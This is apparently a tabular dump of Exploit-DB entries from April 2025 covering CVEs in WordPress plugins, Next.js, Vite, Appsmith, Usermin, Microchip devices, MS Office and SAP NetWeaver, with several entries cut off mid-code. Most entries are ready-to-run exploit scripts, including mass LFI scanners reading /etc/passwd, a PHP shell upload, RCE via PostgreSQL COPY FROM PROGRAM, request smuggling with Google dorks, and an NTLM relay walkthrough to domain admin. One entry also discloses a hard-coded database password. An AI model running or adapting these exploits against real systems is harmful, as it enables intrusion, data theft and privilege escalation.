NOR UNI"" x-frame-options: DENY x-content-type-options: nosniff cache-control: no-store x-xss-protection: 1; mode=block x-permitted-cross-domain-policies: none cross-origin-resource-policy: same-site content-security-policy: frame-ancestors 'none' referrer-policy: no-referrer-when-downgrade strict-transport-security: max-age=31536000; includeSubDomains pragma: no-cache Content-Length: 0. ======== < 3. Solution > ====================================================== Refer to IBM Security Bulletin 7166712 for patch, upgrade or suggested workaround information. See ""References"" for more details. ======== < 4. Disclosure Timeline > =========================================== 19/03/2024 - Vulnerability discovered by the Security Researcher (Giulio Garzia) 21/03/2024 - Vulnerability shared with the client who committed the Penetration Test on his infrastructure, relying on IBM SVA 02/04/2024 - Vulnerability shared with IBM 02/04/2024 - Vulnerability taken over by IBM 14/05/2024 - Vulnerability confirmed by IBM 18/07/2024 - Pre-release provided by IBM to the customer to verify the resolution of the vulnerability 27/08/2024 - Security Bulletin and vulnerability shared by IBM ======== < 5. References > ==================================================== (1) https://www.ibm.com/support/pages/security-bulletin-security-vulnerability-was-fixed-ibm-security-verify-access-cve-2024-35133 (2) https://exchange.xforce.ibmcloud.com/vulnerabilities/291026 (3) https://nvd.nist.gov/vuln/detail/CVE-2024-35133 (4) https://cwe.mitre.org/data/definitions/178.html ======== < 6. Credits > ======================================================= This vulnerability was discovered and reported by: Giulio Garzia 'Ozozuz' Contacts: https://www.linkedin.com/in/giuliogarzia/ https://github.com/Ozozuz ======== < 7. Legal Notices > ================================================ Copyright (c) 2024 Giulio Garzia ""Ozozuz"" Permission is granted for the redistribution of this alert electronically. It may not be edited in any way without mine express written consent. If you wish to reprint the whole or any part of this alert in any other medium other than electronically, please email me for permission. Disclaimer: The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on,this information."
CVE-2025-29927,2025-04-05,exploit db,# Exploit Title: Next.js Middleware Bypass Vulnerability (CVE-2025-29927) # Date: 2025-03-26 # Exploit Author: kOaDT # Vendor Homepage: https://nextjs.org/ # Software Link: https://github.com/vercel/next.js # Version: 13.0.0 - 13.5.8 / 14.0.0 - 14.2.24 / 15.0.0 - 15.2.2 / 11.1.4 - 12.3.4 # Tested on: Ubuntu 22.04.5 LTS # CVE: CVE-2025-29927
CVE-2025-2294,2025-04-05,exploit db,"# Exploit Title: Kubio AI Page Builder <= 2.5.1 - Local File Inclusion (LFI) # Date: 2025-04-04 # Exploit Author: Sheikh Mohammad Hasan (https://github.com/4m3rr0r) # Vendor Homepage: https://wordpress.org/plugins/kubio/ # Software Link: https://downloads.wordpress.org/plugin/kubio.2.5.1.zip # Reference: https://www.cve.org/CVERecord?id=CVE-2025-2294 # Version: <= 2.5.1 # Tested on: WordPress 6.4.2 (Ubuntu 22.04 LTS) # CVE: CVE-2025-2294 Description: The Kubio AI Page Builder plugin for WordPress contains a Local File Inclusion vulnerability in the `kubio_hybrid_theme_load_template` function. This allows unauthenticated attackers to read arbitrary files via path traversal. Can lead to RCE when combined with file upload capabilities. import argparse import re import requests from urllib.parse import urljoin from concurrent.futures import ThreadPoolExecutor class Colors: HEADER = '\033[95m' OKBLUE = '\033[94m' OKGREEN = '\033[92m' WARNING = '\033[93m' FAIL = '\033[91m' ENDC = '\033[0m' BOLD = '\033[1m' UNDERLINE = '\033[4m' def parse_version(version_str): parts = list(map(int, version_str.split('.'))) while len(parts) < 3: parts.append(0) return tuple(parts[:3]) def check_plugin_version(target_url): readme_url = urljoin(target_url, 'wp-content/plugins/kubio/readme.txt') try: response = requests.get(readme_url, timeout=10) if response.status_code == 200: version_match = re.search(r'Stable tag:\s*([\d.]+)', response.text, re.I) if not version_match: return False, ""Version not found"" version_str = version_match.group(1).strip() try: parsed_version = parse_version(version_str) except ValueError: return False, f""Invalid version format: {version_str}"" return parsed_version <= (2, 5, 1), version_str return False, f""HTTP Error {response.status_code}"" except Exception as e: return False, f""Connection error: {str(e)}"" def exploit_vulnerability(target_url, file_path, show_content=False): exploit_url = f""{target_url}/?__kubio-site-edit-iframe-preview=1&__kubio-site-edit-iframe-classic-template={file_path}"" try: response = requests.get(exploit_url, timeout=10) if response.status_code == 200: if show_content: print(f""\n{Colors.OKGREEN}[+] File content from {target_url}:{Colors.ENDC}"") print(Colors.OKBLUE + response.text + Colors.ENDC) return True return False except Exception as e: return False def process_url(url, file_path, show_content, output_file): print(f""{Colors.HEADER}[*] Checking: {url}{Colors.ENDC}"") is_vuln, version_info = check_plugin_version(url) if is_vuln: print(f""{Colors.OKGREEN}[+] Vulnerable: {url} (Version: {version_info}){Colors.ENDC}"") exploit_success = exploit_vulnerability(url, file_path, show_content) if output_file and exploit_success: with open(output_file, 'a') as f: f.write(f""{url}\n"") return url if exploit_success else None else: print(f""{Colors.FAIL}[-] Not vulnerable: {url} ({version_info}){Colors.ENDC}"") return None def main(): parser = argparse.ArgumentParser(description=""Kubio Plugin Vulnerability Scanner"") group = parser.add_mutually_exclusive_group(required=True) group.add_argument(""-u"", ""--url"", help=""Single target URL (always shows file content)"") group.add_argument(""-l"", ""--list"", help=""File containing list of URLs"") parser.add_argument(""-f"", ""--file"", default=""../../../../../../../../etc/passwd"", help=""File path to exploit (default: ../../../../../../../../etc/passwd)"") parser.add_argument(""-o"", ""--output"", help=""Output file to save vulnerable URLs"") parser.add_argument(""-v"", ""--verbose"", action=""store_true"", help=""Show file contents when using -l/--list mode"") parser.add_argument(""-t"", ""--threads"", type=int, default=5, help=""Number of concurrent threads for list mode"") args = parser.parse_args() # Determine operation mode if args.url: # Single URL mode - always show content process_url(args.url, args.file, show_content=True, output_file=args.output) elif args.list: # List mode - handle multiple URLs with open(args.list, 'r') as f: urls = [line.strip() for line in f.readlines() if line.strip()] print(f""{Colors.BOLD}[*] Starting scan with {len(urls)} targets...{Colors.ENDC}"") with ThreadPoolExecutor(max_workers=args.threads) as executor: futures = [] for url in urls: futures.append( executor.submit( process_url, url, args.file, args.verbose, args.output vulnerable_urls = [future.result() for future in futures if future.result()] print(f""\n{Colors.BOLD}[*] Scan complete!{Colors.ENDC}"") print(f""{Colors.OKGREEN}[+] Total vulnerable URLs found: {len(vulnerable_urls)}{Colors.ENDC}"") if args.output: print(f""{Colors.OKBLUE}[+] Vulnerable URLs saved to: {args.output}{Colors.ENDC}"") if __name__ == ""__main__"": main()"
CVE-2024-1234,2025-04-05,exploit db,"# Exploit Title: Exclusive Addons for Elementor ≤ 2.6.9 - Authenticated Stored Cross-Site Scripting (XSS) # Original Author: Wordfence Security Team # Exploit Author: Al Baradi Joy # Exploit Date: March 13, 2024 # Vendor Homepage: https://exclusiveaddons.com/ # Software Link: https://wordpress.org/plugins/exclusive-addons-for-elementor/ # Version: Up to and including 2.6.9 # Tested Versions: 2.6.9 # CVE ID: CVE-2024-1234 # Vulnerability Type: Stored Cross-Site Scripting (XSS) # Description: The Exclusive Addons for Exclusive Addons for Elementor for WordPress, in versions up to and including 2.6.9, is vulnerable to stored cross-site scripting (XSS) via the 's' parameter. Due to improper input sanitization and output escaping, an attacker with contributor-level permissions or higher can inject arbitrary JavaScript that executes when a user views the affected page. # Proof of Concept: Yes # Categories: Web Application, Cross-Site Scripting (XSS), WordPress Plugin # CVSS Score: 6.5 (Medium) # CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N # Notes: To exploit this vulnerability, an attacker needs an authenticated user role with permission to edit posts. Injecting malicious JavaScript can lead to session hijacking, redirections, and other client-side attacks. ## Exploit Code: ```python import requests from urllib.parse import urlparse # Banner def display_banner(): exploit_title = ""CVE-2024-1234: Exclusive Addons for Elementor Plugin Stored XSS"" print(""=""*50) print(f""Exploit Title: {exploit_title}"") print(""Made By Al Baradi Joy"") print(""=""*50) # Function to validate URL def validate_url(url): # Check if the URL is valid and well-formed parsed_url = urlparse(url) if not parsed_url.scheme in [""http"", ""https""]: print(""Error: Invalid URL. Please ensure the URL starts with http:// or https://"") return False return True # Function to exploit XSS vulnerability def exploit_xss(target_url): # The XSS payload to inject payload = "" "" # The parameters to be passed (in this case, we are exploiting the 's' parameter) params = { 's': payload # Send a GET request to the vulnerable URL with the payload try: print(f""Sending exploit to: {target_url}"") response = requests.get(target_url, params=params, timeout=10) # Check if the status code is OK and if the payload is reflected in the response if response.status_code == 200 and payload in response.text: print(f""XSS exploit successful! Payload: {payload}"") elif response.status_code != 200: print(f""Error: Received non-OK status code {response.status_code}"") else: print(""Exploit failed or no XSS reflected."") except requests.exceptions.RequestException as e: print(f""Error: Request failed - {e}"") except Exception as e: print(f""Unexpected error: {e}"") if __name__ == ""__main__"": # Display banner display_banner() # Ask the user for the target URL target_url = input(""Enter the target URL: "").strip() # Validate the provided URL if validate_url(target_url): # Call the exploit function if URL is valid exploit_xss(target_url)"
CVE-2023-5360,2025-04-05,exploit db,"# Exploit Title: WordPress Plugin Royal Elementor Addons <= 1.3.78 - Unauthenticated Arbitrary File Upload (RCE) # Date: 2025-04-04 # Exploit Author: Sheikh Mohammad Hasan (https://github.com/4m3rr0r) # Vendor Homepage: https://royal-elementor-addons.com # Software Link: https://downloads.wordpress.org/plugin/royal-elementor-addons.1.3.78.zip # Version: <= 1.3.78 # Tested on: WordPress 6.3.1, Royal Elementor Addons 1.3.78, Ubuntu 22.04 + Apache2 + PHP 8.1 # CVE: CVE-2023-5360 # Description: # The Royal Elementor Addons and Templates WordPress plugin before 1.3.79 does not properly validate uploaded files, # which allows unauthenticated users to upload arbitrary files (such as .php), leading to Remote Code Execution (RCE). import requests import json import re import argparse import tempfile from urllib.parse import urljoin from rich.console import Console requests.packages.urllib3.disable_warnings() console = Console() def get_nonce(target): try: r = requests.get(target, verify=False, timeout=10) m = re.search(r'var\s+WprConfig\s*=\s*({.*?});', r.text) if m: nonce = json.loads(m.group(1)).get(""nonce"") return nonce except: pass return None def upload_shell(target, nonce, file_path): ajax_url = urljoin(target, ""/wp-admin/admin-ajax.php"") with open(file_path, ""rb"") as f: files = {""uploaded_file"": ("""
CVE-2024-9054,2025-04-04,exploit db,"# Exploit Title: Microchip TimeProvider 4100 (Configuration modules) 2.4.6 - OS Command Injection # Exploit Author: Armando Huesca Prida # Discovered By: Armando Huesca Prida, Marco Negro, Antonio Carriero, Vito Pistillo, Davide Renna, Manuel Leone, Massimiliano Brolli # Date of Disclosure: 27/06/2024 # Date of CVE Publication: 4/10/2024 # Exploit Publication: 10/10/2024 # Vendor Homepage: https://www.microchip.com/ # Version: Firmware release 1.0 through 2.4.7 # Tested on: Firmware release 2.3.12 # CVE: CVE-2024-9054 # External References: # URL: https://www.cve.org/cverecord?id=CVE-2024-9054 # URL: https://0xhuesca.com/2024/10/cve-2024-9054.html # URL: https://www.microchip.com/en-us/solutions/technologies/embedded-security/how-to-report-potential-product-security-vulnerabilities/timeprovider-4100-grandmaster-rce-through-configuration-file # URL: https://www.gruppotim.it/it/footer/red-team.html # Vulnerability Description: A Remote Code Execution (RCE) vulnerability exists in the ""secret_key"" XML tag in the Microchip TimeProvider 4100 device's configuration file. Once the configuration file containing the malicious payload is loaded by the device, after first attempt of login the payload will execute resulting in remote code execution. # Exploitation Steps: 1- Perform login into the device's management web interface. 2- Download the device's configuration file. 3- Substitute the ""secret_key"" value with the malicious payload. 4- Save the new configuration file containing the OS command to be executed. 5- Restore and submit the new configuration. 6- Attempt of login using any active service like SSH/Telnet/Console will trigger the malicious payload. # Example of malicious XML config file: [...] [...] 192.168.1.1 `ping 192.168.1.20` [...] [...] [...] # Proof of Concept -"
CVE-2024-43687,2025-04-04,exploit db,"# Exploit Title: Microchip TimeProvider 4100 Grandmaster (Banner Config Modules) 2.4.6 - Stored Cross-Site Scripting (XSS) # Exploit Author: Armando Huesca Prida # Discovered By: Armando Huesca Prida, Marco Negro, Antonio Carriero, Vito Pistillo, Davide Renna, Manuel Leone, Massimiliano Brolli # Date of Disclosure: 27/06/2024 # Date of CVE Publication: 4/10/2024 # Exploit Publication: 10/10/2024 # Vendor Homepage: https://www.microchip.com/ # Version: Firmware release 1.0 through 2.4.7 # Tested on: Firmware release 2.3.12 # CVE: CVE-2024-43687 # External References: # URL: https://www.cve.org/cverecord?id=CVE-2024-43687 # URL: https://www.0xhuesca.com/2024/10/cve-2024-43687.html # URL: https://www.microchip.com/en-us/solutions/technologies/embedded-security/how-to-report-potential-product-security-vulnerabilities/timeprovider-4100-grandmaster-stored-xss-vulnerability-in-banner # URL: https://www.gruppotim.it/it/footer/red-team.html # Vulnerability Description: The TimeProvider 4100 grandmaster firmware has a stored Cross-Site Scripting (XSS) vulnerability in the custom banner configuration field. A threat actor that exploits this vulnerability is able to execute arbitrary scripts in any user context. # Exploitation Steps: 1- Log in to the device's web management interface. 2- Open the banner configuration panel. 3- Select the ""custom banner"" feature. 4- Insert the malicious JavaScript payload. 5- Apply and save the system configuration containing the custom banner. 6- Victims who connect to the device's web management interface will execute the malicious payload in their browser. # Example of malicious JavaScript payload: # Proof of Concept -"
CVE-2024-42640,2025-04-04,exploit db,# Exploit Title: Angular-Base64-Upload Library 0.1.20 - Remote Code Execution (RCE) # Date: 10 October 2024 # Discovered by : Ravindu Wickramasinghe | rvz (@rvizx9) # Exploit Author: Ravindu Wickramasinghe | rvz (@rvizx9) # Vendor Homepage: https://www.npmjs.com/package/angular-base64-upload # Software Link: https://github.com/adonespitogo/angular-base64-upload # Version: prior to v0.1.21 # Tested on: Arch Linux # CVE : CVE-2024-42640 # Severity: Critical - 10.0 (CVSS 4.0) # Github Link : https://github.com/rvizx/CVE-2024-42640 # Blog Post : https://www.zyenra.com/blog/unauthenticated-rce-in-angular-base64-upload.html # DISCLAIMER: # This proof-of-concept (
CVE-2025-30208,2025-04-03,exploit db,"# Exploit Title: Vite Arbitrary File Read - CVE-2025-30208 # Date: 2025-04-03 # Exploit Author: Sheikh Mohammad Hasan (https://github.com/4m3rr0r) # Vendor Homepage: https://vitejs.dev/ # Software Link: https://github.com/vitejs/vite # Version: <= 6.2.2, <= 6.1.1, <= 6.0.11, <= 5.4.14, <= 4.5.9 # Tested on: Ubuntu # Reference: https://nvd.nist.gov/vuln/detail/CVE-2025-30208 # https://github.com/advisories/GHSA-x574-m823-4x7w # CVE : CVE-2025-30208 # Description # Vite, a provider of frontend development tooling, has a vulnerability in versions prior to 6.2.3, 6.1.2, 6.0.12, 5.4.15, and 4.5.10. `@fs` denies access to files outside of Vite serving allow list. Adding `?raw??` or `?import&raw??` to the URL bypasses this limitation and returns the file content if it exists. This bypass exists because trailing separators such as `?` are removed in several places, but are not accounted for in query string regexes. The contents of arbitrary files can be returned to the browser. Only apps explicitly exposing the Vite dev server to the network (using `--host` or `server.host` config option) are affected. Versions 6.2.3, 6.1.2, 6.0.12, 5.4.15, and 4.5.10 fix the issue. import requests import argparse import urllib3 from colorama import Fore, Style # Disable SSL warnings urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) def check_vulnerability(target, file_path, verbose=False, output=None): url = f""{target}{file_path}?raw"" print(f""{Fore.CYAN}[*] Testing: {url}{Style.RESET_ALL}"") try: response = requests.get(url, timeout=5, verify=False) # Ignore SSL verification if response.status_code == 200 and response.text: vuln_message = f""{Fore.GREEN}[+] Vulnerable : {url}{Style.RESET_ALL}"" print(vuln_message) if verbose: print(f""\n{Fore.YELLOW}--- File Content Start ---{Style.RESET_ALL}"") print(response.text[:500]) # Print first 500 characters for safety print(f""{Fore.YELLOW}--- File Content End ---{Style.RESET_ALL}\n"") if output: with open(output, 'a') as f: f.write(f""{url}\n"") else: print(f""{Fore.RED}[-] Not vulnerable or file does not exist: {url}{Style.RESET_ALL}"") except requests.exceptions.RequestException as e: print(f""{Fore.YELLOW}[!] Error testing {url}: {e}{Style.RESET_ALL}"") def check_multiple_domains(file_path, file_to_read, verbose, output): try: with open(file_to_read, 'r') as file: domains = file.readlines() for domain in domains: domain = domain.strip() if domain: check_vulnerability(domain, file_path, verbose, output) except FileNotFoundError: print(f""{Fore.RED}[!] Error: The file '{file_to_read}' does not exist.{Style.RESET_ALL}"") if __name__ == ""__main__"": parser = argparse.ArgumentParser(description="""
CVE-2024-38200,2025-04-03,exploit db,"# Exploit Title: Microsoft Office 2019 MSO Build 1808 - NTLMv2 Hash Disclosure # Exploit Author: Metin Yunus Kandemir # Vendor Homepage: https://www.office.com/ # Software Link: https://www.office.com/ # Details: https://github.com/passtheticket/CVE-2024-38200 # Version: Microsoft Office 2019 MSO Build 1808 (16.0.10411.20011), Microsoft 365 MSO (Version 2403 Build 16.0.17425.20176) # Tested against: Windows 11 # CVE: CVE-2024-38200 # Description MS Office URI schemes allow for fetching a document from remote source. MS URI scheme format is '< scheme-name >:< command-name >""|""< command-argument-descriptor > ""|""< command-argument >' . Example: ms-word:ofe|u|http://hostname:port/leak.docx When the URI ""ms-word:ofe|u|http://hostname:port/leak.docx"" is invoked from a victim computer. This behaviour is abused to capture and relay NTLMv2 hash over SMB and HTTP. For detailed information about capturing a victim user's NTLMv2 hash over SMB, you can also visit https://www.privsec.nz/releases/ms-office-uri-handlers. # Proof Of Concept If we add a DNS A record and use this record within the Office URI, Windows will consider the hostname as part of the Intranet Zone. In this way, NTLMv2 authentication occurs automatically and a standard user can escalate privileges without needing a misconfigured GPO. Any domain user with standard privileges can add a non-existent DNS record so this attack works with default settings for a domain user. 1. Add a DNS record to resolve hostname to attacker IP address which runs ntlmrelayx. It takes approximately 5 minutes for the created record to start resolving. $ python dnstool.py -u 'unsafe.local\testuser' -p 'pass' -r 'attackerhost' --action 'add' --data [attacker-host-IP] [DC-IP] --zone unsafe.local 2. Fire up ntlmrelayx with following command $ python ntlmrelayx.py -t ldap://DC-IP-ADDRESS --escalate-user testuser --http-port 8080 3. Serve following HTML file using Apache server. Replace hostname with added record (e.g. attackerhost). Microsoft Office 4. Send the URL of the above HTML file to a user with domain admin privileges. You should check whether the DNS record is resolved with the ping command before sending the URL. When the victim user navigates to the URL, clicking the 'Open' button is enough to capture the NTLMv2 hash. (no warning!) 5. The captured NTLMv2 hash over HTTP is relayed to Domain Controller with ntlmrelayx. As a result, a standard user can obtain DCSync and Enterprise Admins permissions under the default configurations with just two clicks."
CVE-2024-44762,2025-04-03,exploit db,"# Exploit Title: Webmin Usermin 2.100 - Username Enumeration # Date: 10.02.2024 # Exploit Author: Kjesper # Vendor Homepage: https://www.webmin.com/usermin.html # Software Link: https://github.com/webmin/usermin # Version: <= 2.100 # Tested on: Kali Linux # CVE: CVE-2024-44762 # https://senscybersecurity.nl/cve-2024-44762-explained/ #!/usr/bin/python3 # -*- coding: utf-8 -*- # Usermin - Username Enumeration (Version 2.100) # Usage: UserEnumUsermin.py -u HOST -w WORDLIST_USERS # Example: UserEnumUsermin.py -u https://127.0.0.1:20000 -w users.txt import requests import json import requests import argparse import sys from urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning) parser = argparse.ArgumentParser() parser.add_argument(""-u"", ""--url"", help = ""use -u with the url to the host of usermin, EX: \""-u https://127.0.0.1:20000\"""") parser.add_argument(""-w"", ""--wordlist_users"", help = ""use -w with the username wordlist, EX: \""-w users.txt\"""") args = parser.parse_args() if len(sys.argv) != 5: print(""Please provide the -u for URL and -w for the wordlist containing the usernames"") print(""EX: python3 UsernameEnum.py -u https://127.0.0.1:20000 -w users.txt"") exit() usernameFile = open(args.wordlist_users, 'r') dataUsername = usernameFile.read() usernameFileIntoList = dataUsername.split(""\n"") usernameFile.close() for i in usernameFileIntoList: newHeaders = {'Content-type': 'application/x-www-form-urlencoded', 'Referer': '%s/password_change.cgi' % args.url} params = {'user':i, 'pam':'', 'expired':'2', 'old':'fakePassword', 'new1':'password', 'new2':'password'} response = requests.post('%s/password_change.cgi' % args.url, data=params, verify=False, headers=newHeaders) if ""Failed to change password: The current password is incorrect."" in response.text: print(""Possible user found with username: "" + i) if ""Failed to change password: Your login name was not found in the password file!"" not in response.text and ""Failed to change password: The current password is incorrect."" not in response.text: print(""Application is most likely not vulnerable and are therefore quitting."") exit() # comment out line 33-35 if you would still like to try username enumeration."
CVE-2024-4007,2025-04-03,exploit db,"# Exploit Title : ABB Cylon Aspect 3.07.01 - Hard-coded Default Credentials Vendor: ABB Ltd. Product web page: https://www.global.abb Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio Firmware: <=3.07.01 Summary: ASPECT is an award-winning scalable building energy management and control solution designed to allow users seamless access to their building data through standard building protocols including smart devices. Desc: The ABB BMS/BAS controller is operating with default and hard-coded credentials contained in install package while exposed to the Internet. Tested on: GNU/Linux 3.15.10 (armv7l) GNU/Linux 3.10.0 (x86_64) GNU/Linux 2.6.32 (x86_64) Intel(R) Atom(TM) Processor E3930 @ 1.30GHz Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz PHP/7.3.11 PHP/5.6.30 PHP/5.4.16 PHP/4.4.8 PHP/5.3.3 AspectFT Automation Application Server lighttpd/1.4.32 lighttpd/1.4.18 Apache/2.2.15 (CentOS) OpenJDK Runtime Environment (rhel-2.6.22.1.-x86_64) OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode) phpMyAdmin 2.11.9 Vulnerability discovered by Gjoko 'LiquidWorm' Krstic @zeroscience Reported by DIVD Advisory ID: ZSL-2024-5830 Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2024-5830.php CVE ID: CVE-2024-4007 CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=2024-4007 21.04.2024 $ cat project P R O J E C T $ cat max/var/www/html/phpMyAdmin/config.inc.php | grep control $cfg['Servers'][$i]['controluser'] = 'root'; $cfg['Servers'][$i]['controlpass'] = 'F@c1liTy';"
CVE-2025-29471,2025-04-03,exploit db,"# Exploit Title: Stored XSS Vulnerability in Nagios Log Server (Privilege Escalation to Admin) # Date: 2025-04-02 # Exploit Author: Seth Kraft # Vendor Homepage: https://www.nagios.com/ # Vendor Changelog: https://www.nagios.com/changelog/#log-server # Software Link: https://www.nagios.com/products/log-server/download/ # Version: 2024R1.3.1 and below # Tested On: Nagios Log Server 2024R1.3.1 (default configuration, Ubuntu 20.04) # CWE: CWE-79, CWE-352, CWE-285, CWE-269, CWE-602 # CVSS: 9.3 (CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:R/S:C/VC:H/VI:H/VA:H) # Type: Stored Cross-Site Scripting (XSS), Privilege Escalation # Exploit Risk: Critical # Disclosure For research and authorized testing only. Do not use against systems without permission. # Description: A stored XSS vulnerability in Nagios Log Server 2024R1.3.1 allows a low-privileged user to inject malicious JavaScript into the 'email' field of their profile. When an administrator views the audit logs, the script executes, resulting in privilege escalation via unauthorized admin account creation. The vulnerability can be chained to achieve remote code execution (RCE) in certain configurations."
CVE-2024-55963,2025-04-03,exploit db,"# Exploit Title: AppSmith 1.47 - Remote Code Execution (RCE) # Original Author: Rhino Security Labs # Exploit Author: Nishanth Anand # Exploit Date: April 2, 2025 # Vendor Homepage: https://www.appsmith.com/ # Software Link: https://github.com/appsmithorg/appsmith # Version: Prior to v1.52 # Tested Versions: v1.47 # CVE ID: CVE-2024-55963 # Vulnerability Type: Remote Code Execution # Description: Unauthenticated remote code execution in Appsmith versions prior to v1.52 due to misconfigured PostgreSQL database allowing COPY FROM PROGRAM command execution. # Proof of Concept: Yes # Categories: Web Application, Remote Code Execution, Database # CVSS Score: 9.8 (Critical) # CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H # Notes: The vulnerability exists in Appsmith's internal PostgreSQL database configuration, allowing attackers to execute arbitrary commands on the host system. import requests import json import pyfiglet import argparse # Create a banner using pyfiglet banner = pyfiglet.figlet_format(""Appsmith RCE"") # Replace with your desired title print(banner) # Set up argument parser parser = argparse.ArgumentParser(description='Appsmith RCE Proof of Concept') parser.add_argument('-u', '--url', required=True, help='Base URL of the target') parser.add_argument('command', nargs='?', default='id', help='Command to execute') args = parser.parse_args() # Get the base URL and command from the parsed arguments base_url = args.url command_arg = args.command if not base_url.startswith(""http://"") and not base_url.startswith(""https://""): base_url = ""http://"" + base_url # Signup request signup_url = f""{base_url}/api/v1/users"" signup_data = { ""email"": ""poc1@"
CVE-2022-22536,2025-04-02,exploit db,"# Exploit Title: SAPGateBreaker Exploit - CVE-2022-22536 - HTTP Request Smuggling Through SAP's Front Door # Google Dork: https://github.com/BecodoExploit-mrCAT/SAPGateBreaker-Exploit/blob/main/dorks # Date: Tuesday, April 2, 2025 # Exploit Author: @C41Tx90 - Victor de Queiroz - Beco do Exploit - Elytron Security # Vendor Homepage: https://community.sap.com/t5/technology-blogs-by-members/remediation-of-cve-2022-22536-request smuggling-and-request-concatenation/ba-p/13528083 # Software Link: https://help.sap.com/docs/SUPPORT_CONTENT/uiwits/3361892375.html # Version: SAP NetWeaver Application Server ABAP, SAP NetWeaver Application Server Java, ABAP Platform, SAP Content Server 7.53 and SAP Web Dispatcher # Tested on: Red Hat Enterprise Linux (RHEL) # CVE : 2022-22536 https://github.com/BecodoExploit-mrCAT/SAPGateBreaker-Exploit SAPGateBreaker - CVE-2022-22536 HTTP Request Smuggler Author: @C41Tx90 - Victor de Queiroz | elytronsecurity.com | becodoexploit.com Target: SAP NetWeaver Application Server Vulnerability: CVE-2022-22536 Exploit Type: HTTP Request Smuggling (Content-Length-based) Impact: ACL Bypass, Internal Access More information and explanations: https://github.com/BecodoExploit-mrCAT/SAPGateBreaker-Exploit Sample Payload: GET /sap/admin/public/default.html HTTP/1.1 Host: 172.32.22.7:50000 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://172.32.22.7:50000/sap/admin/public/default.html X-Requested-With: XMLHttpRequest Connection: keep-alive Cookie: saplb_*=(J2EE7364720)7364750 Authorization: Basic YTph Content-Length: 89 0\r \r GET /heapdump/ HTTP/1.1\r Host: 127.0.0.1\r X-Forwarded-For: 127.0.0.1\r \r Expected Response: HTTP/1.1 200 OK server: SAP NetWeaver Application Server last-modified: Tue, 01 Sep 2020 11:54:39 GMT sap-cache-control: +3600 date: Tue, 01 Apr 2025 20:49:02 GMT content-length: 4465 content-type: text/html connection: Keep-Alive x-dummy: 0 Indicators of Success: - Status code 200 for internal endpoints - Difference between direct access (403/404) and smuggled (200) - Access to otherwise restricted SAP services via loopback injection Example Paths Tested: - /sap/public/bc/icf/info - /sap/bc/webdynpro/sap/appl_soap_management - /heapdump/ - /ctc/ConfigServlet - /sap/public/bc/icf/logon.html - /webdynpro/resources/sap.com/tc~lm~config~content/ SAP NetWeaver Application Server ABAP, SAP NetWeaver Application Server Java, ABAP Platform, SAP Content Server 7.53 and SAP Web Dispatcher are vulnerable for request smuggling and request concatenation. An unauthenticated attacker can prepend a victim's request with arbitrary data. This way, the attacker can execute functions impersonating the victim or poison intermediary Web caches. A successful attack could result in complete compromise of Confidentiality, Integrity and Availability of the system. Google Dorks: intitle:""SAP NetWeaver Application Server Java"" inurl:/webdynpro/resources/ intitle:""SAP NetWeaver"" ""SAP J2EE Engine"" intitle:""Welcome to SAP NetWeaver"" inurl:/irj/portal intitle:""SAP NetWeaver Administrator"" inurl:/nwa inurl:""/sap/bc/webdynpro"" -site:sap.com inurl:""/sap/public"" ""SAP NetWeaver"" inurl:""/sap/admin/public/default.html"" inurl:""/webdynpro/welcome/Welcome.html"" inurl:""/sap/public/info.jsp"" ""Powered by SAP NetWeaver"" inurl:sap intitle:""SAP Web Dispatcher Administration"" # Exploit import argparse import http.client from urllib.parse import urlparse from colorama import Fore, Style, Back, init import os init(autoreset=True) BANNER = f"""""" {Fore.WHITE} (\__/\ Breaking the Gate | {Style.BRIGHT}{Fore.WHITE}by{Style.RESET_ALL} {Fore.YELLOW}@C41Tx90{Fore.WHITE} | ({Fore.RED}•{Fore.WHITE}デ{Fore.RED}•{Fore.WHITE}) {Style.BRIGHT}{Fore.YELLOW} CVE-2022-22536{Style.RESET_ALL} | {Fore.GREEN}t.me/becodoxpl{Fore.WHITE} | / つ {Fore.WHITE}HTTP Request Smuggler | {Fore.YELLOW}becodoexploit.com{Fore.WHITE} | {Fore.LIGHTBLUE_EX}elytronsecurity.com{Fore.WHITE} | def detect_sap_version(host, port, is_https): try: conn_class = http.client.HTTPSConnection if is_https else http.client.HTTPConnection conn = conn_class(host, port, timeout=5) conn.request(""GET"", ""/"") res = conn.getresponse() headers = {k.lower(): v for k, v in res.getheaders()} server_header = headers.get(""server"", ""Unknown"") print(f""{Fore.YELLOW}[*] {Fore.WHITE}Detected SAP Server Header: {Fore.CYAN}{server_header}\n"") return server_header except Exception as e: print(f""{Fore.RED}[!] {Fore.WHITE}Could not determine SAP version: {e}\n"") return ""Unknown"" def build_smuggled_request(path): return f""0\r\n\r\nGET {path} HTTP/1.1\r\nHost: 127.0.0.1\r\nX-Forwarded-For: 127.0.0.1\r\nConnection: close\r\n\r\n"" def try_file_read(host, port, is_https, verbose): test_paths = [ ""/sap/public/bc/icf/info"", ""/sap/public/info.jsp"", ""/sap/public/test/test.jsp"", ""/sap/bc/webdynpro/sap/appl_soap_management"", ""/sap/public/bc/soap/rfc"", ""/webdynpro/welcome/Welcome.html"", ""/sr_central"", ""/useradmin/.jsp"", ""/heapdump/"", ""/startPage"", ""/crossdomain.xml"", ""/ctc/ConfigServlet"", ""/webdynpro/resources/sap.com/tc~lm~config~content/"", ""/sld"", ""/sap/bc/webdynpro/sap/wdy_cfg_component_config"", ""/sap/public/bc/icf/logon.html"", ""/sap/bc/webdynpro/sap/itadmin"", 